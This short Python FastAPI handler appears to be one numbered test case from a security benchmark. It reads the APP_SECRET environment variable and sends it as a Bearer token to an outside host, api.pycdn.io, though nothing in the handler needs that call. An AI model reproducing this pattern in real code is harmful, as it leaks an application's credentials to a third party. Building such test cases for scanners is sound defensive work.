# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import os


def to_text(value):
    return str(value).strip()

async def BenchmarkTest55202(request: Request):
    secret_value = 'default_setting_value'
    data = to_text(secret_value)
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
